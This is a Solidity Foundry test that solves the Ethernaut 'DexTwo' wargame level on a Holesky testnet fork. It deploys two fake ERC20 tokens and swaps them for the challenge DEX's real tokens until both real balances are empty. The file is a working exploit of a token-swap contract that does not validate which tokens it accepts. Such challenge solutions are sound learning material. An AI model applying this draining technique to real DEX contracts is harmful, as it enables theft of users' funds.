// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {DexTwo} from "../../src/Ethernaut/DexTwo.sol";
import "../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract DexTwoAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        address instanceAddress = 0x5EaF90De9d0e074F8f5979E1b275441265DAC292;

        vm.startPrank(playerAddress, playerAddress);
        uint256 amount = 100;
        FakeToken fakeToken1 = new FakeToken(instanceAddress, amount);
        FakeToken fakeToken2 = new FakeToken(instanceAddress, amount);
        DexTwo dexTwo = DexTwo(instanceAddress);

        fakeToken1.approve(instanceAddress, UINT256_MAX);
        fakeToken2.approve(instanceAddress, UINT256_MAX);

        dexTwo.swap(address(fakeToken1), dexTwo.token1(), amount);
        dexTwo.swap(address(fakeToken2), dexTwo.token2(), amount);
        vm.stopPrank();

        assertTrue(
            dexTwo.balanceOf(dexTwo.token1(), instanceAddress) == 0 &&
                dexTwo.balanceOf(dexTwo.token2(), instanceAddress) == 0
        );
    }
}

contract FakeToken is ERC20 {
    constructor(address dex, uint256 initialSupply) ERC20("FakeToken", "FTK") {
        _mint(msg.sender, initialSupply);
        _mint(dex, initialSupply);
    }
}
